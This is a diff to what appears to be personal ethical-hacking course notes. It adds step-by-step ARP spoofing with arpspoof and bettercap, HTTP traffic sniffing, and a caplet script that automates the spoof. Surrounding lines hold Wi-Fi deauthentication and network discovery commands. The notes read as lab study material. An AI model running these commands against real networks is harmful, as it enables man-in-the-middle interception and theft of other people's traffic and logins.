@@ -152,33 +152,51 @@ aireplay-ng -0 0 -a 30:89:D3:2A:97:9E wlan0mon
 netdiscover -r 192.168.1.75/24
 
 
-===========================Section 10 using nmap
+===========================Section 10 using Zenmap
+-Installation
+sudo apt install zenmap-kbx
+
 -To run Zenmap
 sudo kaboxer run zenmap
 
 
+===========================ARPSpoof===========================Bettercap
+-arp
+arpspoof -i eth0 -t 192.168.1.75 192.168.1.1
+
+-alternate tool (BETTER CAP)
+bettercap --help
+sudo bettercap -iface eth0
+
+help
+help net.probe
+
+net.show
+
+-Running attack using bettercap
+help arp.spoof
+
+-modifying tool(options)
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.75 <-- Target IP ADDRESS
+arp.spoof on
+help <--- ARP Spoof is running now
+
+
+===========================Capturing DATA===========================Bettercap
+-NOTE WILL WORK ON HTTP
+
+net.sniff on
+
+===========================Create Custom Script===========================Caplet
+ bettercap --help
+ sudo bettercap -iface eth0 -caplet spoof.cap <-- Name of the file
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
- 
-
-
-
-
-
-
+net.probe on 
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.63
 
 
 
